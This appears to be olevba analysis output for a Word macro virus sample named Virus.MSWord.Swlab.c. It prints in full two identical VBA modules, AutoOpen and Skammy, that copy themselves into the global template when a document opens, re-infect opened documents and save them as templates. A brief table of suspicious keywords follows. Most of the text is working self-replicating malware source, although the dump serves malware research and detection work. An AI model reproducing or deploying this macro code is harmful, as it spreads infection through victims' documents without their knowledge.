olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Swlab.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Swlab.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Swlab.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the 15TSEX Created by Natas

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:Skammy", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
oOtoOpenHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO Skammy.bas 
in file: ./Virus.MSWord.Swlab.c - OLE stream: 'Macros/VBA/Skammy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the 15TSEX Created by Natas

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:Skammy", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
oOtoOpenHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

